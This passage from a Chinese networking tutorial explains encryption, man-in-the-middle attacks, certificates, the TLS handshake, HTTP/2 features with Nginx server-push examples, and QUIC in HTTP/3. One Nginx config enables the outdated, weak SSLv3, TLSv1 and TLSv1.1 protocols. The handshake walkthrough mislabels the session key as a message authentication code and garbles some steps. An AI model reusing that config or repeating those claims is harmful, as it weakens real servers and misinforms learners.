![](./img/2-10-2-1-对称加密1.jpg)

假设 B 是没有解密钥匙，所以 A 需要通过互联网将钥匙发送给 B。

但是 X 也有可能看到并获取到这个钥匙，因此，X 也可以通过这个钥匙来解密密文。

##### 2.10.2.2 非对称加密

为了解决上面的**钥匙交付问题**，我们这里引入一个新的方法 —— **非对称加密**（Asymmetric Key Algorithms）

- 用于加密的密钥被称为**公钥**，用于解密的密钥被称为**私钥**
- 跟**对称加密**相比，公开密钥加密往往**需要更多的时间**用于加密和解密

**非对称加密过程**

接收方 B 创建一个公钥和一个私钥，公钥被发送给 A。

![](./img/2-10-2-2-非对称加密.jpg)

- A 使用公钥加密数据，将密文发送给 B
- B 使用私钥解密从 A 接收到的密文，得到原始数据

![](./img/2-10-2-2-非对称加密1.jpg)

在这个过程中：

- 密文和公钥也可能被恶意第三方 X 截获
- 但是私钥是 B 保存的，X 无法获取到，自然没有办法解密密文
- 这样就很好的解决了**钥匙交付问题**

**公开密钥加密的问题**

1. 加密和解密都需要耗费时间，有一种叫**混合加密**的方法可以解决这个问题
2. 公开密钥的可靠性

##### 2.10.2.3 混合加密

![](./img/2-10-2-3-混合加密.jpg)

混合密钥加密分为两个步骤：

- 通过公开密钥加密传递密钥
- 通过速度更快的对称密钥加密方法传递数据

##### 2.10.2.4 中间人攻击

中间人攻击（Man In the Middle Attack）。

为了更好地理解公开密钥加密的可靠性问题，我们回到传递公钥的场景。

![](./img/2-10-2-4-中间人攻击.jpg)

A 拿到的其实是 X 发送给他的伪造公钥，但是 A 无法察觉。

![](./img/2-10-2-4-中间人攻击1.jpg)

最后，X 用他自己的密钥加密响应数据，并发送给 A，就这样，虽然 A、B 双方能顺利完成通信，但是恶意的第三方 X 能看到解密后的请求数据和响应数据，而 A、B 双方则毫不知情。

中间人攻击的攻击方式：

- 域名污染：DNS 解析的中间链点返回中间人错误 IP
- ARP 欺骗

潜在的中间人攻击威胁：

- 浏览器弹出的证书警告，可能访问的是钓鱼网站或假冒的服务器
- 公共 Wifi 下，没有 HTTPS 加密的网站不要随便登录
- 在任何网站登录账号必须走 HTTPS 加密协议

##### 2.10.2.5 消息鉴别码

消息鉴别码（Message Authentication Code，简写 MAC）是一种用于确认消息完整性（数据不会被篡改）和可靠性（消息认证是确认消息来自正确的发送者）的技术。消息鉴别码可以理解为**密钥**和**密文**组成的字符串的**哈希值**。

![](./img/2-10-2-5-消息鉴别码.jpg)

消息鉴别码虽然可以解决**伪造**问题，但是仍然无法避免**否认**问题。

##### 2.10.2.6 数字签名

为了解决这个**否认**问题，我们接下来看看**数字签名**方法。

数据发送方通过约定的哈希函数从数据报文中生成报文摘要（Digest），然后利用私钥对报文摘要进行加密，这个加密后的摘要将作为报文的**数字签名**和**数据报文**一起发送给接收方。

数据接收方首先使用与发送方一致的哈希函数从接收到的原始报文中计算出报文摘要，接着再用发送方的公钥对数字签名进行解密，得出摘要。如果摘要相同，那么接收方就能确认该数字签名是发送方的。

![](./img/2-10-2-6-数字签名.jpg)

##### 2.10.2.7 数字证书

虽然上面的方法已经能避免窃听、伪造、否认等问题，但是现在还是没办法避免**中间人攻击**，因为我们还是没办法验证公钥的所有者，因此我们需要**数字证书**系统来验证公钥的所有者。

接下来，先看看数字证书申请的过程，我们将数字证书认证机构（Certificate Authority）称之为 CA。

**数字证书申请过程：**

1. 服务器方向第三方机构 CA **提交公钥**、**组织信息**、**个人信息（域名）** 等信息并申请认证
2. CA 通过线上、线下等多种手段验证申请者提供信息的真实性，如组织是否存在、企业是否合法、是否拥有域名的所有权等
3. 如信息审核通过，CA 会向申请者签发认证文件证书。证书包含以下信息：**申请者公钥**、**申请者的组织**和**个人信息**、**签发机构 CA 的信息**、**有效时间**、**证书序列号**等信息的明文，同时包含**数字签名**。

数字签名通过**散列函数**计算公开的明文信息的**信息摘要**，然后，采用 CA 提供的私钥对信息摘要进行加密，加密后的信息摘要即为**数字签名**

![](./img/2-10-2-7-数字证书.jpg)

现在 B 已经申请到一个数字证书了，那么怎么使用数字证书来检验公钥 PB 是属于 B 呢。

**数字证书校验流程：**

1. 客户端向服务端发送请求时，服务端返回数字证书文件
2. 客户端读取证书中的相关的明文信息，采用与加密时相同的**散列函数**计算得到信息摘要，然后利用内置客户端中的受信任的 CA 公钥解密数字签名，对比证书的信息摘要
   - 如果一致，则可以确认证书的合法性，即公钥合法
   - 如果不一致，则可以确认证书为非法，即公钥非法
   - 如果 CA 不被信任，则找不到对应 CA 证书，证书也会被判定为非法，即公钥非法
3. 客户端验证证书相关的域名信息、有效时间等信息

![](./img/2-10-2-7-数字证书校验流程1.jpg)

现在可以验证 PB 是属于 B 的，但是怎么验证 PC 是属于受信任的 CA 的呢。

![](./img/2-10-2-7-数字证书校验流程2.jpg)

事实上，认证机构形成一个树形结构，高级别的权威机构为较低级别的机构创建证书，那就是说，如果要验证的话，就是一级一级向上认证，信任链条的最终是 Root CA，他采用自签名，对他的签名是无条件的信任。

![](./img/2-10-2-7-数字证书校验流程3.jpg)

#### 2.10.3 工作流程

HTTPS 在传输数据之前需要客户端（浏览器）与服务端之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL 协议使用**非对称加密**、**对称加密**以及 **HASH 算法**确保信息通信的安全。

![](./img/2-10-3-工作流程.jpg)

**具体流程：**

1. **Client Hello**：客户端发起 HTTPS 请求。

   - 不同的客户端对不同的加密算法的支持度不同，因此客户端会将支持的一套**加密套件**（Cipher Suite）发送给服务端（除了加密组合方式，报文中还包括 TLS 的协议版本、随机生成的密码串记为 Random1、会话 ID、域名 ServerName 以及签名算法）

2. **Server Hello**：服务端从客户端支持的加密规则中选用一组加密算法（包括用于生成通信密钥的算法），并随机生成密码串记为 Random2，后续将数据传回客户端。

   - **Certificate**：服务端收到 Client Hello 之后，向客户端发送 CA 认证的数字证书，用来鉴别服务端身份信息，同时还要生成一个 **随机数** 同时保存在服务端和发送给客户端。证书包含 **网站信息**、**由 CA 私钥加密的通信公钥**，以及 **经证书的颁发机构的私钥加密产生的数字签名** 等信息。
   - **Server Hello Done**：表示服务端宣告第一阶段的客户端服务端握手协商结束
   - 可选：**Certificate Request**：必要情况下，要求客户端发送证书验证身份
   - 可选：**Server Key Exchange**：如果 CA 认证的数字证书提供的信息不够，服务端还可发送提供补充信息

3. **Client Finish**

   - Client Key Exchange

     - 客户端收到 CA 数字证书并通过验证，然后通过 CA 公钥解密获取到 **服务端公钥**

     - 客户端先读取数字证书中相关的明文信息，采用相同的 Hash 函数计算得到

       信息摘要

       ，然后利用内置在客户端中的对应的 CA 的公钥解密

       数字签名

       数据，并与数字证书的摘要进行对比

       - 如果一致，则证书合法，即公钥合法（如果证书受信任，则客户端地址栏会显示小锁头）
       - 如果不一致，则证书非法，即公钥非法（如果证书不受信任，则会提示用户证书存在问题）

     - 如果证书受信任，客户端会根据两个 pubkey 随机数生成一串随机数的密钥记为 Pre-Master 随机数，并利用两次 Hello 报文产生的两个随机数 Random1 和 Random2，利用对称密钥生成算法生成对称密钥 `enc_key = Func(Random1, Random2, Pre-Master)`（即**消息鉴别码**：即用于终端数据交互的**对称密钥**），并用证书中提供的服务端公钥加密该随机数

     - **传送加密信息**：使用约定好的 HASH 算法计算握手信息，并使用**对称密钥**对消息进行加密，最后将之前生成的所有信息发送给服务端

   - **Change Cipher Spec**：该报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥进行加密通信（也就是使用两个随机数以及第三个 Pre-master key/secret 随机数一起算出一个对称密钥 **session key/secret**）

   - **Finished** 报文：该报文包括连接至此的所有报文的校验值，使用服务端公钥进行加密

   - 可选：**ClientCertificate** 报文：如果服务端请求，客户端需要发送 CA 数字证书

   - 可选：**CertificateVerify** 报文：服务端如果要求 CA 数字证书，那么需要通过 HASH 算法计算一个服务端发送来的信息摘要

4. **Server Finish**：使用私钥将信息解密取出密钥，使用密钥解密客户端发来的握手信息，并验证 HASH 是否与浏览器发来的一致

   - **New Session Ticket**：服务端最后对客户端发送过来的 Finished 报文使用服务端私钥进行解密校验
   - **Change Cipher Spec**：报文通知服务端，此后的通信都将使用协商好的加密算法计算对称密钥 session key/secret 进行加密通信
   - **Finished** 报文：标志 TLS 连接建立成功

5. 浏览器解密并计算握手信息的 Hash，如果与服务端发来的 Hash 一致，此时握手过程结束，之后所有的通信数据将由之前客户端生成的对称密钥并利用堆成加密算法进行加密

这里客户端与服务端互相发送加密的握手消息并验证，目的是为了保证双方都获得了一致的密码，并且可以正常的加密解密数据，为后续真正数据的传输做一次测试。

客户端取出提前内置在手机内部的认证机构的公钥

1. 用认证机构的公钥去解密公钥证书里的数字签名 从而得到数字指纹
2. 客户端对公钥证书的服务器公钥进行 数字摘要算法 从而生成数字指纹
3. 对比客户端自己生成的数字指纹(第 3 步)和解密得到的数字指纹(第 2 步)是否一致 如果一致则公钥证书验证通过 就可以进行接下来的握手步骤了

> - Client Hello 包含域名的信息是比较特别的，因为域名是工作在应用层 HTTP 里的，而握手是发生在 TLS 还在传输层。在传输层里面就把域名信息告诉服务端，好让服务器根据域名发送相应的证书。

#### 2.10.4 相关算法

##### 2.10.4.1 散列函数

常见的散列函数 Hash 算法：[MD5](https://zh.wikipedia.org/wiki/MD5)、[SHA1](https://zh.wikipedia.org/wiki/SHA-1)、[SHA256](https://zh.wikipedia.org/wiki/SHA家族)

散列函数特点是函数单向不可逆转、对输入非常敏感、输出长度固定，针对数据的任何修改都会改变散列函数的结果，用于**防止信息篡改**并**验证数据的完整性**。

在信息传递过程中，散列函数不能单独实现信息信息防篡改，因为**明文传输**，中间人可以修改信息之后重新计算信息摘要，因此需要对传输的信息以及信息摘要进行加密。

##### 2.10.4.2 对称加密

常见的对称加密算法：[AES-CBC](https://zh.wikipedia.org/wiki/AES指令集)、[DES](https://zh.wikipedia.org/wiki/資料加密標準)、[3DES](https://zh.wikipedia.org/wiki/3DES)、[RC4](https://zh.wikipedia.org/wiki/RC4)

相同的密钥可以用于信息的加密和解密，掌握密钥才能获取信息，能够防止信息窃听，通信方式是 1 对 1。

对称加密的优势是信息传输 1 对 1，需要共享相同的密码，密码的安全是保证信息安全的基础，服务器和 N 个客户端通信，需要维持 N 个密码记录，且缺少修改密码的机制。

##### 2.10.4.3 非对称加密

常见非对称加密算法：[RSA](https://zh.wikipedia.org/wiki/RSA加密演算法)、DSA / DSS

密钥成对出现，一般称为公钥（公开）和私钥（保密），公钥加密的信息只能私钥解开，私钥加密的信息只能公钥解开。因此掌握公钥的不同客户端之间不能互相解密信息，只能和掌握私钥的服务器进行加密通信，服务器可以实现 1 对 N 的通信，客户端也可以用来验证掌握私钥的服务器身份。

非对称加密的特点是 1 对多，服务器只需要维持一个私钥就能够和多个客户端进行加密通信，但服务器发出的信息能够被所有的客户端解密，且该算法的计算复杂，加密速度慢。

#### 2.10.5 通信协议对比

**HTTP 协议和 HTTPS 协议的区别**

| 区别     | HTTP                                                         | HTTPS                                                        |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 协议     | 运行在 TCP 之上，明文传输，客户端与服务端都无法验证通信双方的身份 | 基于 SSL 的 HTTP，运行于 SSL 之上，SSL 运行于 TCP 之上，是添加了加密和认证机制的 HTTP |
| 端口     | 80                                                           | 443                                                          |
| 资源消耗 | 较少                                                         | 由于加密处理，会消耗更多 CPU 和内存资源                      |
| 开销     | 无需证书                                                     | 需要 CA 证书，而证书一般需要向认证机构购买                   |
| 加密机制 | 无                                                           | 共享密钥加密和公开密钥加密并用的混合加密机制                 |
| 安全性   | 弱                                                           | 由于加密机制，安全性强                                       |

**HTTPS 主要作用**

- 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全
- 对网站服务器进行真实身份认证

### 2.11 HTTP2

HTTP/2（超文本传输协议第 2 版，最初命名为 HTTP 2.0），简称为 h2（基于 TLS/1.2 或以上版本的加密连接）或 h2c（非加密连接），是 HTTP 协议的的第二个主要版本，使用于万维网。

主要新特性：

- 传输数据量大量减少
  - 二进制分帧
  - 标头压缩
- 多路复用及相关功能
  - 多路复用
  - 优先级与依赖性
- 服务器消息推送
  - 服务器推送
- 其他
  - 重置流
  - 流量控制
  - HTTPS RFC 规范并没有要求 HTTP2 强制使用 TLS，但是目前世界所有浏览器和- 服务器实现都基于 HTTPS 来实现 HTTP2

#### 2.11.1 旧版本问题

1. **多个 TCP 连接**：虽然 HTTP/1.1 管线化可以支持请求并发，但是浏览器很难实现，主流浏览器厂商都禁用了管线化
2. **队头阻塞**：TCP 连接上只能发送一个请求，由于单连接上的串行请求，前面的请求未完成前，后续的请求都在排队等待
3. **头部冗余**：HTTP/1.x 采用文本格式传输，首部未压缩，无状态特性让每个请求都会带上 Cookie、User-Agent 等重复的信息
4. **不支持服务端主动推送**：HTTP/1.1 不支持服务推送消息，只能使用轮询的方式解决

#### 2.11.2 二进制分帧

相比于 HTTP/1.x 基于以换行符作为纯文本的分隔符的解析，HTTP/2 将所有的传输信息分割为更小的消息和帧，并对它们采用 **二进制格式编码**。基于二进制可以使协议有更多的扩展性，例如，引入帧来传输数据和指令。

HTTP/2 所有性能增强的核心在于新的 **二进制分帧层**，它定义了如何封装 HTTP 消息并在客户端与服务器之间传输。

> 这里所谓的 **层**，指的是位于套接字接口与应用可见的高级 HTTP API 之间一个经过优化的新编码机制：HTTP 的语义（包括各种动词、方法、标头）都不受影响，不同的是传输期间对它们的编码方式变了。

#### 2.11.3 数据流、消息和帧

新的二进制分帧机制改变了客户端与服务器之间交换数据的方式。

为了说明这个过程，我们需要了解 HTTP/2 的三个概念：

- **数据流**（Stream）：已建立的连接内的 双向字节流，可以承载一条或多条消息
- **消息**（Message）：与逻辑请求或响应消息对应的完整的一系列帧
- **帧**（Frame）：HTTP/2 通信的最小单位，每个帧都包含帧头，至少也会标识出当前帧所属的数据流

这些概念的关系总结如下：

- 所有通信都在一个 TCP 连接上完成，此连接 **可以承载任意数量的双向数据流**
- 每个数据流都有一个 **唯一的标识符和可选的优先级信息**，用于承载双向消息
- 每条消息都是一条逻辑 HTTP 消息（例如请求或响应），包含一个或多个帧
- 帧是最小的通信单位，承载着特定类型的数据，例如 HTTP 标头、消息负载等等。来自不同数据流的帧可以交错发送，然后根据每个帧头的数据流标识符重新组装。

HTTP/2 将 HTTP 协议通信分解为二进制编码帧的交换，这些帧对应着特定数据流中的消息。所有这些都在一个 TCP 连接内复用，这是 HTTP/2 协议所有其他功能和性能优化的基础。

![](./img/2-11-3-stream.svg)

**消息的组成：HEADERS 帧与 DATA 帧**

- HEADERS frame 头部帧
- DATA frame 数据帧

![](./img/2-11-3-消息png)

#### 2.11.4 标头压缩

标头压缩（Header compression）：每个 HTTP 传输都承载一组标头，这些标头说明了传输的资源及其属性。 在 HTTP/1.x 中，此元数据始终以纯文本形式，通常会给每个传输增加 500–800 字节的开销。如果使用 HTTP Cookie，增加的开销有时会达到上千字节。

为了减少此开销和提升性能，HTTP/2 使用 **HPACK** 压缩格式压缩请求和响应标头元数据，这种格式采用两种简单但是强大的技术：

1. 这种格式支持通过静态霍夫曼代码对传输的标头字段进行编码，从而减小了各个传输的大小。
2. 这种格式要求通讯双方 **各自缓存一份头域索引表**，相同的消息头只发送 **索引号**（换句话说，它可以建立一个共享的压缩上下文），此索引表随后会用作参考，对之前传输的值进行有效编码。

利用霍夫曼编码（HPACK），可以在传输时对各个值进行压缩，而利用之前传输值的索引列表，我们可以通过传输索引值的方式对重复值进行编码，索引值可用于有效查询和重构完整的标头键值对。

**索引表用法示意**

![](./img/2-11-4-索引表.jpg)

客户端发了两次请求，第一次请求有完整的 HTTP 报文头部，第二次请求的时候只有一个 `path` 的字段不一样，但是这次报文头它只需要发送一个 `path` 的字段就好了，这样就大大减少了发送的量。这个的实现要求客户端和服务同时维护一个报文头表。

##### 2.11.4.1 HPACK 霍夫曼编码

![](./img/2-11-4-1-HPACK.png)

作为一种进一步优化方式，HPACK 压缩上下文包含一个静态字典和一个动态字典：

- [静态字典](https://httpwg.org/specs/rfc7541.html#static.table.definition) 在规范中定义，并提供了一个包含所有连接都可能使用的常用 HTTP 标头字段（例如，有效标头名称）的列表
- 动态字典最初为空，将根据在特定连接内交换的值进行更新

因此，为之前未见过的值采用静态 Huffman 编码，并替换每一侧静态表或动态表中已存在值的索引，可以减小每个请求的大小。

#### 2.11.5 多路复用

**多路复用（MultiPlexing）**：通过该功能，在一条连接上，您的浏览器可以同时发起无数个请求，并且响应可以同时响应。另外，多路复用中支持了流的优先级（Stream dependencies）设置，允许客户端告知服务器最优资源，可以优先传输。

当我们打开网站时，浏览器会对每个网页并发的连接进行限制，一般浏览器的 HTTP 请求并发数限制在 6-8 个。但实际上，绝大部分网站首页所需要的资源个数远大于这个限制。所以为了不让资源在下载阶段就被阻塞住，我们往往会把一些静态资源分散到 CDN 或其他服务器上，从而通过多域名的方式突破浏览器对并发连接数的限制，从而使得网站能同时下载尽可能多的资源。

但建立更多的连接也意味更多的开销。每个 HTTP 请求都对应建立 TCP 连接，也许有些资源体积只有几 kb，这些情况下建立连接本身的开销就变得更客观，很可能三次握手的实践比传输时间还长

在 HTTP/2 中，有了二进制分帧之后，HTTP/2 不再依赖 TCP 链接去实现多流并行，而是通过 **流** 支持多路复用。

将 HTTP 消息分解为独立的帧，交错发送，然后在另一端重新组装是 HTTP/2 最重要的一项增强。事实上，这个机制会在整个网络技术栈中引发一系列连锁反应，从而带来巨大的性能提升，让我们可以：

- 并行交错地发送多个请求/响应，请求/响应之间互不影响
- 不必再为绕过 HTTP/1.x 限制而做很多工作（请参阅 [针对 HTTP/1.x 进行优化](https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x)，例如级联文件、Image Sprites 和域名分片
- 消除不必要的延迟和提高现有网络容量的利用率，从而减少页面加载时间

HTTP/2 中的新二进制分帧层解决了 HTTP/1.x 中存在的 **队头阻塞** 问题，也消除了并行处理和发送请求及响应时对多个连接的依赖。

#### 2.11.6 服务器推送

服务端推送（Server push）：同 SPDY 一样，HTTP/2 也具有客户端推送功能。目前，大多数网站已经启用 HTTP/2，如淘宝。使用服务器推动，可以提前将资源推送至浏览器缓存。

HTTP/2 中的 Server Push 并不是指类似于现在的 Server Sent Event（SSE） 或者 WebSocket 的推送技术。**它是一种服务器根据客户端以前发送的请求来猜测未来的请求，并提前将未来请求的结果推送给客户端的技术**。

![](./img/2-11-6-服务器推送.png)

> 为什么在浏览器中需要一种此类机制呢？

一个典型的网络应用包含多种资源，客户端需要检查服务器提供的文档才能逐个找到它们。 那为什么不让服务器提前推送这些资源，从而减少额外的延迟时间呢？ 服务器已经知道客户端下一步要请求什么资源，这时候服务器推送即可派上用场。

事实上，如果您在网页中内联过 CSS、JavaScript，或者通过数据 URI 内联过其他资产（请参阅 [资源内联](https://hpbn.co/http1x/#resource-inlining)），那么您就已经亲身体验过服务器推送了。 对于将资源手动内联到文档中的过程，我们实际上是在将资源推送给客户端，而不是等待客户端请求。 使用 HTTP/2，我们不仅可以实现相同结果，还会获得其他性能优势。

推送资源可以进行以下处理：

- 由客户端缓存
- 在不同页面之间重用
- 与其他资源一起复用
- 由服务器设定优先级
- 被客户端拒绝

##### 2.11.6.1 Nginx 配置实现

通过 Nginx 配置能主动推送两个 HTML 文档中需要请求的文件：

```nginx
server {
    # 设定开启使用 HTTP2
    listen 443 ssl http2;
    server_name  localhost;

    ssl                      on;
    ssl_certificate          /etc/nginx/certs/example.crt;
    ssl_certificate_key      /etc/nginx/certs/example.key;

    ssl_session_timeout  5m;

    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers   on;

    location / {
      root   /usr/share/nginx/html;
      index  index.html index.htm;

      # 服务器主动推送这两个文件
      http2_push /style.css;
      http2_push /example.png;
    }
```

这种方式需要写在服务器配置中，每次修改都要重启服务，而且应用与服务器的配置不应该混在一起。

##### 2.11.6.2 服务端实现

服务器推送还有另一个实现方法，就是后端应用产生 HTTP 响应头信息 `Link` 命令。服务器发现有这个头信息，就会进行服务器推送。

```js
Link: </styles.css>; rel=preload; as=style
```

如果要推送多个资源：

```js
Link: </styles.css>; rel=preload; as=style, </example.png>; rel=preload; as=image
```

这时，Nginx 的配置改成下面这样。

```nginx
server {
    listen 443 ssl http2;

    # ...

    root /var/www/html;

    location = / {
        proxy_pass http://upstream;
        http2_push_preload on;
    }
}
```

如果服务器或者浏览器不支持 HTTP2，那么浏览器就会按照 `preload` 来处理这个头信息，预加载指定的资源文件。事实上，这个头信息就是 `preload` 标准提出的，它的语法和 `as` 属性的值都写在了 [标准](https://w3c.github.io/preload/#as-attribute) 里面。

##### 2.11.6.3 缓存问题

服务器推送有一个很麻烦的问题。所要推送的资源文件，如果浏览器已经有缓存，推送就是浪费带宽。即使推送的文件版本更新，浏览器也会优先使用本地缓存。

一种解决办法是，只对第一次访问的用户开启服务器推送。下面是 Nginx 官方给出的示例，根据 Cookie 判断是否为第一次访问。

```nginx
server {
    listen 443 ssl http2 default_server;

    ssl_certificate ssl/certificate.pem;
    ssl_certificate_key ssl/key.pem;

    root /var/www/html;
    http2_push_preload on;

    location = /demo.html {
        add_header Set-Cookie "session=1";
        add_header Link $resources;
    }
}


map $http_cookie $resources {
    "~*session=1" "";
    default "</style.css>; as=style; rel=preload";
}
```

#### 2.11.7 安全提升

> HTTP/2 是不是必须基于 TLS/SSL 协议？

- IETF 标准不要求必须基于 TLS/SSL 协议 
- 浏览器要求必须基于 TLS/SSL 协议 
- 在 TLS 层 ALPN（Application Layer Protocol Negotiation）扩展做协商，只认 HTTP/1.x 的代理服务器不会干扰 HTTP/2
- sheme：`http://` 和 `https://` 默认基于 80 和 443 端口
- h2：基于 TLS 协议运行的 HTTP/2 被称为 `h2`
- h2c：基于 TCP 协议之上运行的 HTTP/2 被称为 `h2c`

### 2.12  HTTP3

虽然 HTTP/2 解决了很多之前旧版本的问题，但是它还是存在一个巨大的问题，主要是底层支撑的 TCP 协议造成的。HTTP/2 的缺点主要有以下两点：

- **建立连接的延时**：HTTP/2 使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，**这样就需要有两个握手延迟过程**
- **队头阻塞并没有彻底解决**：在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的。但当出现了丢包时，HTTP/2 的表现反倒不如 HTTP/1 了。因为 TCP 为了保证可靠传输，有个 **丢包重传** 机制，丢失的包必须要等待重新传输确认，HTTP/2 出现丢包时，整个 TCP 都要开始等待重传，那么就会阻塞该 TCP 连接中的所有请求。而对于 HTTP/1.1 来说，可以开启多个 TCP 连接，出现这种情况反到只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据

Google 在推 SPDY 的时候就已经意识到了这些问题，于是就另起炉灶搞了一个基于 UDP 协议的“QUIC”协议，让 HTTP 跑在 QUIC 上而不是 TCP 上。 而这个“HTTP over QUIC”就是 HTTP 协议的下一个大版本，HTTP/3。

![QUIC 协议](./img/2-12-QUIC协议.png)

QUIC 虽然基于 UDP，但是在原本的基础上新增了很多功能，接下来我们重点介绍几个 QUIC 新功能。不过 HTTP/3 目前还处于草案阶段，正式发布前可能会有变动，所以本文尽量不涉及那些不稳定的细节。

#### 2.12.1零 RTT 建立连接

HTTP/2 的连接需要 3 RTT，如果考虑会话复用，即把第一次握手算出来的对称密钥缓存起来，那么也需要 2 RTT，更进一步的，如果 TLS 升级到 1.3，那么 HTTP/2 连接需要 2 RTT，考虑会话复用则需要 1 RTT。

有人会说 HTTP/2 不一定需要 HTTPS，握手过程还可以简化。这没毛病，HTTP/2 的标准的确不需要基于 HTTPS，但实际上所有浏览器的实现都要求 HTTP/2 必须基于 HTTPS，所以 HTTP/2 的加密连接必不可少。

而 HTTP/3 首次连接只需要 1 RTT，后面的连接更是只需 0 RTT，意味着客户端发给服务端的第一个包就带有请求数据，这一点 HTTP/2 难以望其项背。那这背后是什么原理呢？我们具体看下 QUIC 的连接过程。

1. 首次连接时，客户端发送 Inchoate Client Hello 给服务端，用于请求连接；
2. 服务端生成 g、p、a，根据 g、p 和 a 算出 A，然后将 g、p、A 放到 Server Config 中再发送 Rejection 消息给客户端；
3. 客户端接收到 g、p、A 后，自己再生成 b，根据 g、p、b 算出 B，根据 A、p、b 算出初始密钥 K。B 和 K 算好后，客户端会用 K 加密 HTTP 数据，连同 B 一起发送给服务端；
4. 服务端接收到 B 后，根据 a、p、B 生成与客户端同样的密钥，再用这密钥解密收到的 HTTP 数据。为了进一步的安全（前向安全性），服务端会更新自己的随机数 a 和公钥，再生成新的密钥 S，然后把公钥通过 Server Hello 发送给客户端。连同 Server Hello 消息，还有 HTTP 返回数据；
5. 客户端收到 Server Hello 后，生成与服务端一致的新密钥 S，后面的传输都使用 S 加密。

这样，QUIC 从请求连接到正式接发 HTTP 数据一共花了 1 RTT，这 1 个 RTT 主要是为了获取 Server Config，后面的连接如果客户端缓存了 Server Config，那么就可以直接发送 HTTP 数据，实现 0 RTT 建立连接。

这里使用的是 DH 密钥交换算法，DH 算法的核心就是服务端生成 a、g、p 3 个随机数，a 自己持有，g 和 p 要传输给客户端，而客户端会生成 b 这 1 个随机数，通过 DH 算法客户端和服务端可以算出同样的密钥。在这过程中 a 和 b 并不参与网络传输，安全性大大提高。因为 p 和 g 是大数，所以即使在网络中传输的 p、g、A、B 都被劫持，那么靠现在的计算机算力也没法破解密钥。

#### 2.12.2 连接迁移

TCP 连接基于四元组（源 IP、源端口、目的 IP、目的端口），切换网络时至少会有一个因素发生变化，导致连接发生变化。当连接发生变化时，如果还使用原来的 TCP 连接，则会导致连接失败，就得等原来的连接超时后重新建立连接，所以我们有时候发现切换到一个新网络时，即使新网络状况良好，但内容还是需要加载很久。如果实现得好，当检测到网络变化时立刻建立新的 TCP 连接，即使这样，建立新的连接还是需要几百毫秒的时间。

QUIC 的连接不受四元组的影响，当这四个元素发生变化时，原连接依然维持。那这是怎么做到的呢？道理很简单，QUIC 连接不以四元组作为标识，而是使用一个 64 位的随机数，这个随机数被称为 Connection ID，即使 IP 或者端口发生变化，只要 Connection ID 没有变化，那么连接依然可以维持。

#### 2.12.3 队头阻塞和多路复用

队头阻塞会导致 HTTP/2 在更容易丢包的弱网络环境下比 HTTP/1.1 更慢！

那 QUIC 是如何解决队头阻塞问题的呢？主要有两点。

- QUIC 的传输单元是 Packet，加密单元也是 Packet，整个加密、传输、解密都基于 Packet，这样就能避免 TLS 的队头阻塞问题
- QUIC 基于 UDP，UDP 的数据包在接收端没有处理顺序，即使中间丢失一个包，也不会阻塞整条连接，其他的资源会被正常处理

#### 2.12.4 拥塞控制

拥塞控制的目的是避免过多的数据一下子涌入网络，导致网络超出最大负荷。QUIC 的拥塞控制与 TCP 类似，并在此基础上做了改进。所以我们先简单介绍下 TCP 的拥塞控制。

TCP 拥塞控制由 4 个核心算法组成：慢启动、拥塞避免、快速重传和快速恢复，理解了这 4 个算法，对 TCP 的拥塞控制也就有了大概了解。

- **慢启动**：发送方向接收方发送 1 个单位的数据，收到对方确认后会发送 2 个单位的数据，然后依次是 4 个、8 个……呈指数级增长，这个过程就是在不断试探网络的拥塞程度，超出阈值则会导致网络拥塞；
- **拥塞避免**：指数增长不可能是无限的，到达某个限制（慢启动阈值）之后，指数增长变为线性增长；
- **快速重传**：发送方每一次发送时都会设置一个超时计时器，超时后即认为丢失，需要重发；
- **快速恢复**：在上面快速重传的基础上，发送方重新发送数据时，也会启动一个超时定时器，如果收到确认消息则进入拥塞避免阶段，如果仍然超时，则回到慢启动阶段。

QUIC 重新实现了 TCP 协议的 Cubic 算法进行拥塞控制，并在此基础上做了不少改进。下面介绍一些 QUIC 改进的拥塞控制的特性。

##### 2.12.4.1 热插拔

TCP 中如果要修改拥塞控制策略，需要在系统层面进行操作。QUIC 修改拥塞控制策略只需要在应用层操作，并且 QUIC 会根据不同的网络环境、用户来动态选择拥塞控制算法。

##### 2.12.4.2 前向纠错 FEC

QUIC 使用前向纠错（FEC，Forward Error Correction）技术增加协议的容错性。一段数据被切分为 10 个包后，依次对每个包进行异或运算，运算结果会作为 FEC 包与数据包一起被传输，如果不幸在传输过程中有一个数据包丢失，那么就可以根据剩余 9 个包以及 FEC 包推算出丢失的那个包的数据，这样就大大增加了协议的容错性。

这是符合现阶段网络技术的一种方案，现阶段带宽已经不是网络传输的瓶颈，往返时间才是，所以新的网络传输协议可以适当增加数据冗余，减少重传操作。

##### 2.12.4.3 单调递增的 Packet Number

TCP 为了保证可靠性，使用 Sequence Number 和 ACK 来确认消息是否有序到达，但这样的设计存在缺陷。

超时发生后客户端发起重传，后来接收到了 ACK 确认消息，但因为原始请求和重传请求接收到的 ACK 消息一样，所以客户端就郁闷了，不知道这个 ACK 对应的是原始请求还是重传请求。如果客户端认为是原始请求的 ACK，但实际上是左图的情形，则计算的采样 RTT 偏大；如果客户端认为是重传请求的 ACK，但实际上是右图的情形，又会导致采样 RTT 偏小。图中有几个术语，RTO 是指超时重传时间（Retransmission TimeOut），跟我们熟悉的 RTT（Round Trip Time，往返时间）很长得很像。采样 RTT 会影响 RTO 计算，超时时间的准确把握很重要，长了短了都不合适。

QUIC 解决了上面的歧义问题。与 Sequence Number 不同的是，Packet Number 严格单调递增，如果 Packet N 丢失了，那么重传时 Packet 的标识不会是 N，而是比 N 大的数字，比如 N + M，这样发送方接收到确认消息时就能方便地知道 ACK 对应的是原始请求还是重传请求。

##### 2.12.4.4 ACK Delay

TCP 计算 RTT 时没有考虑接收方接收到数据到发送确认消息之间的延迟，如下图所示，这段延迟即 ACK Delay。QUIC 考虑了这段延迟，使得 RTT 的计算更加准确。

##### 2.12.4.5 更多的 ACK 块

